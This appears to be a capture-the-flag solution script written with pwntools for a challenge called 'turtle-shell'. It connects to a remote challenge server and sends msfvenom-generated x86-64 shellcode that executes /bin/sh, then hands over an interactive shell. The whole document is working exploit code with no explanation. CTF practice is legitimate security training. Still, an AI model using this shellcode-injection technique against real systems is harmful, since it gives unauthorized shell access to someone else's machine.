from pwn import *

# p = process('./turtle-shell')
# gdb.attach(p, gdbscript='b *main+148')

p = remote('turtle.sdc.tf', 1337)
# msfvenom -p linux/x64/exec --platform linux --arch x64 --format python
buf =  b""
buf += b"\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50"
buf += b"\x54\x5f\x52\x5e\x6a\x3b\x58\x0f\x05"

print(p.recv().decode(errors='ignore'))
p.sendline(buf)
p.interactive()
